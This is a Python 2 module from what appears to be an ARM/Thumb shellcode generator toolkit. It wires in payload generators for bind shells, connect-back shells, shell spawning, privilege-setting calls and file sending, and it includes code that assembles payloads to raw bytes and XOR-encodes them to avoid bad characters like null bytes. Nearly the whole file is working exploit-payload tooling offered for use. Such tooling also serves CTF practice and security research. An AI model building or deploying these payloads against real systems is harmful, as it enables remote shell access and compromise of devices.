#!python
import os
import sys
import tempfile
from socket import ntohs
from struct import unpack, pack

__VERSION__ = '$0.0.6'
__AUTHOR__  = 'alex.park'

##########################################################
## Thumb Mode 
##########################################################
from shellcodes.thumb import chmod       as th_chmod
from shellcodes.thumb import dup         as th_dup
from shellcodes.thumb import sh          as th_sh
from shellcodes.thumb import dupsh       as th_dupsh
from shellcodes.thumb import bindshell   as th_bindshell
from shellcodes.thumb import listen      as th_listen
from shellcodes.thumb import acceptloop  as th_acceptloop
from shellcodes.thumb import connect     as th_connect
from shellcodes.thumb import connectback as th_connectback
from shellcodes.thumb import open_file   as th_open_file
from shellcodes.thumb import sendfile    as th_sendfile
from shellcodes.thumb import cat         as th_cat
from shellcodes.thumb import exit        as th_exit
from shellcodes.thumb import findpeer    as th_findpeer
from shellcodes.thumb import findpeersh  as th_findpeersh
from shellcodes.thumb import getdents    as th_getdents
from shellcodes.thumb import ls          as th_ls
from shellcodes.thumb import setreuid    as th_setreuid
from shellcodes.thumb import setregid    as th_setregid
from shellcodes.thumb import overwrite   as th_overwrite
from shellcodes.thumb import appendwrite as th_appendwrite
from shellcodes.thumb import read_from_stack as th_read_from_stack
from shellcodes.thumb import write_to_stack  as th_write_to_stack
from shellcodes.thumb import infinityloop    as th_infinityloop

##########################################################
## ARM Mode
##########################################################
from shellcodes.arm import dup   as arm_dup
from shellcodes.arm import sh    as arm_sh
from shellcodes.arm import dupsh as arm_dupsh

class thumbSCGen:
    """Thumb Mode Shellcode Generator Class

    """
    def __init__(self):
        self.chmod       = th_chmod.generate
        self.dup         = th_dup.generate
        self.sh          = th_sh.generate
        self.dupsh       = th_dupsh.generate
        self.bindshell   = th_bindshell.generate
        self.listen      = th_listen.generate
        self.acceptloop  = th_acceptloop.generate
        self.connect     = th_connect.generate
        self.connectback = th_connectback.generate
        self.open_file   = th_open_file.generate
        self.sendfile    = th_sendfile.generate
        self.cat         = th_cat.generate
        self.exit        = th_exit.generate
        self.findpeer    = th_findpeer.generate
        self.findpeersh  = th_findpeersh.generate
        self.getdents    = th_getdents.generate
        self.ls          = th_ls.generate
        self.setreuid    = th_setreuid.generate
        self.setregid    = th_setregid.generate
        self.overwrite   = th_overwrite.generate
        self.appendwrite = th_appendwrite.generate
        self.read_from_stack = th_read_from_stack.generate
        self.write_to_stack  = th_write_to_stack.generate
        self.infinityloop    = th_infinityloop.generate

class armSCGen:
    """ARM Mode Shellcode Generator Class

    """
    def __init__(self):
        self.dup        = arm_dup.generate
        self.sh         = arm_sh.generate
        self.dupsh      = arm_dupsh.generate

# Assembler 
BIN_AS = '/usr/bin/arm-linux-gnueabi-as'
ALTER_BIN_AS = 'as'
# Linker
BIN_LD = '/usr/bin/arm-linux-gnueabi-ld'
ALTER_BIN_LD = 'ld'
# Objcopy
BIN_OC = '/usr/bin/arm-linux-gnueabi-objcopy'
ALTER_BIN_OC = 'objcopy'
# RAW Shellcode
RAW_SC = 'raw_sc'

def SYSERR(m):
    """SYSERR(m) -> None

    Print syserr(2) screen to debug

    Args:
        m(fmt): message will be printed on syserr screen

    """
    print >> sys.stderr, "%s" % (m)

def cleanup(fn):
    """clean up compiled files

    Args:
        fn(list): files in list will be deleted

    """
    for f in fn:
        if os.path.exists(f) == True:
            try:
                os.unlink(f)
            except:
                pass

def prepareCompiler():
    """prepares some PATH to compile safely

    """
    global BIN_AS
    global BIN_LD
    global BIN_OC

    if os.path.exists(BIN_AS) == False:
        BIN_AS = ALTER_BIN_AS

    if os.path.exists(BIN_LD) == False:
        BIN_LD = ALTER_BIN_LD

    if os.path.exists(BIN_OC) == False:
        BIN_OC = ALTER_BIN_OC

def CompileSC(source, isThumb=False, isNeedHead=True):
    """Compiles shellcode

    Args:
        source (str): shellcode in strings

        isThumb (boolean): Thumb or ARM Mode

        isNeedHead (boolean): It shows up if true


    Returns:
      compiled shellcode 

    """
    ASM_HEAD = """
    .global _start
    .section .text
    _start:
    """

    ASM_THUMB = """
    .arm
    add r6, pc, #1
    bx r6
    .thumb
    """

    fn = tempfile.mktemp() # binary file
    fn_s = fn + '.s' # as file
    fn_o = fn + '.o' # ld file
    fn_raw = fn + '.raw' # objcopy 
    will_be_deleted = [fn, fn_s, fn_o, fn_raw]

    src = ''
    if isNeedHead:
        src += ASM_HEAD + '\n'

    #if isThumb:
    #    src += ASM_THUMB + '\n'

    src += source
    # write a source
    open(fn_s, 'w').write(src)

    # compile a source
    if isThumb:
        COMPILE = '%s %s -o %s -mthumb' % (BIN_AS, fn_s, fn_o)
    else:
        COMPILE = '%s %s -o %s' % (BIN_AS, fn_s, fn_o)
    os.system(COMPILE)
    if os.path.exists(fn_o) == False:
        print "Failed to compile a source: %s" % (fn_s)
        cleanup(will_be_deleted)
        return ""

    # link an object
    LINKING = '%s %s -o %s' % (BIN_LD, fn_o, fn)
    os.system(LINKING)
    if os.path.exists(fn_o) == False:
        print "Failed to link an object: %s" % (fn_o)
        cleanup(will_be_deleted)
        return ""

    # objcopy 
    OBJCOPY = '%s -I elf32-little -j .text -O binary %s %s' % (BIN_OC, fn, fn_raw)
    os.system(OBJCOPY)
    if os.path.exists(fn_raw) == False:
        print "Failed to make a raw file: %s" % (fn)
        cleanup(will_be_deleted)
        return ""

    f = open(fn_raw,'rb').read()
    cleanup(will_be_deleted)

    return f

def printHex(xhex):
    """print hex code in human-readable

    Args:
        xhex(hex): hex code

    Returns:
        human-readable hex code like '\\x41'

    """
    xtmp = ''
    xhex = xhex.encode('hex')
    for x in range(0, len(xhex), 2):
        xtmp += '\\x' + xhex[x:x+2]

    return xtmp

def XOREncoder(scSize, xorkey, SC):
    """XOR Encoder to avoid some bad codes like ``0x0a``, ``0x00`` and so on

    Args:
        scSize(int): shellcode length

        xorkey(int): XOR key

        SC(str): shellcode

    Returns:
        XOR Encoder shellcode in string

    """
    MAX_SC_SIZE = 256
    LOOP_SC_SIZE = MAX_SC_SIZE - scSize

    sc="""
    adr r8, scode

main:
    mov r4, #%s
    adr r6, nanosleep

loop:
    cmp  r4, #%s
    bxhi r6
    sub  r4, r4, #%s
    ldrb r5, [r8, r4]
    eor  r5, r5, #%s
    strb r5, [r8, r4]
    add  r4, r4, #%s

backloop:
    b loop
backmain:
    bl main

nanosleep:
    .arm
    add r6, pc, #1
    bx r6
    .thumb
nanosleep2:
    sub r5, r5, r5
    add r5, r5, #1
    sub r6, r6, r6
    push {r5, r6}
    push {r5, r6}
    mov r0, sp
    mov r1, sp
    mov r7, #162
    svc 1

scode:
    .asciz "%s"
    """ % (LOOP_SC_SIZE, MAX_SC_SIZE, LOOP_SC_SIZE, xorkey, LOOP_SC_SIZE+1, printHex(SC))

    return sc

def findXorKey(sc, bc=['\x00', '\x0a']):
    """find XOR key to scramble and to avoid all of bad chars such as ``0x00``

        Args:
            sc(str): shellcode

            bc(list): bad chars to avoid

        Returns:
            key (int): XOR key

        Examples:
            >>> print findXorKey(sc)
            2
    """
    size = len(sc)
    bcs  = bc
    for i in range(0x01, 0xFF+1):
        key = i
        for s in sc:
            x = (ord(s) ^ i)
            if chr(x) in bcs:
                key = -1
                break
        if key != -1:
            return key
    return -1


def encodeShellcode(sc, key):
    """encodes shellcode with key to avoid all of bad chars such as ``0x00``

        Args:
            sc(str): shellcode
            key(int/str): XOR key

        Returns:
            xoredSC(str): XORed Shellcode

        Examples:
            >>> print encodeShellcode(sc, findXorKey(sc))
            '\x0e\x02\x8d\xe0\x02"\xa2\xe1\x07\x02/\xeb\x0f\x12\xa2\xe3\t\x02\x92\xed-`kl-qj\x02'
    """

    xsc = ''
    for i in range(0, len(sc)):
        xsc += chr( ord(sc[i]) ^ key )
    
    return xsc

def checkBadChar(sc, bc=[0x00, 0x0a]):
    """checks bad chars in shellcode string

    Args:
        sc(str): shellcode

        bc(list): bad chars like ``0x00``, ``0x0a``

    Returns:
        list if bad chars exists
    """

    from collections import defaultdict
    bcs = defaultdict(int)
    size = len(sc)
    for s in sc:
        if s in bc:
            bcs[s] += 1

    return bcs

def MakeXorShellcode(sc, isThumb=False):
    """Make XOR Encoder with Shellcode

    Args:
        sc(str): shellcode

        isThumb(boolean): ARM or Thumb Mode

    Returns:
        shellcode in hex

    Examples:
        >>> sc = MakeXorShellcode(bindshell, isThumb=True)

    """
    key = findXorKey(sc)
    if key == -1:
        SYSERR("Failed to find xor key")
        return ""

    xorsc  = encodeShellcode(sc, key)
    xorenc = XOREncoder(len(xorsc), key, xorsc)
    rv = checkBadChar(xorenc)
    if len(rv) != 0:
        SYSERR("!!! Bad char has been found in shellcode. Please check out")
        return ""

    return CompileSC(xorenc, isThumb=isThumb)

def u16(u):
    """struct.unpack(2-bytes)

    Args:
        u(str): 2-bytes packed data

    Returns:
        unsigned short value

    """
    return unpack('<h', u)[0]

def getdent_to_list(rv):
    """parses getdent's struct to human readable.
    
       Args: 
            rv(str): getdent's struct included file/directory name(s)
            
       Returns:
            fn(list): file/directory name(s)
    """
    i  = 0
    fn = []
    try:
        while 1:
            inode   = rv[i:i+4]
            off     = rv[i+4:i+8]
            st_size = u16(rv[i+8:i+10])
            fname   = rv[i+10:i+st_size]

            if st_size == 0:
                break
            xfname = fname.split('\x00')[0]

            if len(xfname) != 0:
                fn.append(xfname)
            i = i + st_size
            if i == len(rv):
                break
            if i > len(rv):
                # weird but have to exit
                break
    except:
        return fn.append('exception')

    return fn

def thumb_fixup(reg, value):
    """fixes up value for register 

       Args:
            reg(str): register

            value(int): real value

       Retruns:
            fn(str): arranged value with register
    """
    if value <= 255:
        return "\tmov %s, #%s" % (reg, value)

    fn = []
    fn.append('\tsub %s, %s, %s' % (reg, reg, reg))
    mod = value % 255
    div = value / 255

    for v in range(0, div):
        fn.append('\tadd %s, %s, #255' % (reg, reg))
    fn.append('\tadd %s, %s, #%s' % (reg, reg, mod))

    return '\n'.join(fn)
